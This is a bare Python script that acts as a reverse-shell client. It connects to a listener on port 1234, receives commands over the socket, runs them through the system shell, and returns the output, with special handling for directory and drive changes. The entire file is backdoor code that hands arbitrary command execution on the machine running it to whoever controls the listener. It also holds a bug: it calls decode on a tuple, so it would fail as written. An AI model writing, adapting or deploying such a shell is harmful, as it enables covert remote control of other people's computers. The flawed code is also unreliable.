import socket
import struct
import subprocess
import os


bridge = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
bridge.connect(('localhost',1234))


def execute_command(command):
    current_dir = os.getcwd()

    if len(command) == 2 and command[1] == ":" and command[0].isalpha():
        # Handle drive letter change (e.g., 'e:', 'f:', 'c:')
        try:
            os.chdir(command)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change drive: {str(e)}"

    if command.lower().startswith("cd "):
        # Handle 'cd' command separately to update the current directory
        try:
            path = command[3:]  # Extract the path from the 'cd' command
            os.chdir(path)
            current_dir = os.getcwd()
        except Exception as e:
            return f"Failed to change directory: {str(e)}"

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True, cwd=current_dir)
        return output
    except subprocess.CalledProcessError as e:
        error_message = f"Command failed with return code {e.returncode}."
        if e.output:
            error_message += "\n" + e.output
        return error_message
    except Exception as e:
        return f"An error occurred: {str(e)}"


while True:
    # receive the command
    size = bridge.recv(512)
    command = bridge.recv(int(size.decode()))
    unpackedresponse = struct.unpack(f"{round(int(size.decode())/struct.calcsize('s')+1)}s",command)
    print(unpackedresponse.decode())
    # send the response
    response = execute_command(unpackedresponse[0].decode())
    bytestream = struct.pack(f"{len(response)}s",response.encode())
    bridge.send(str(struct.calcsize("s")*len(response)).encode())
    bridge.send(bytestream)


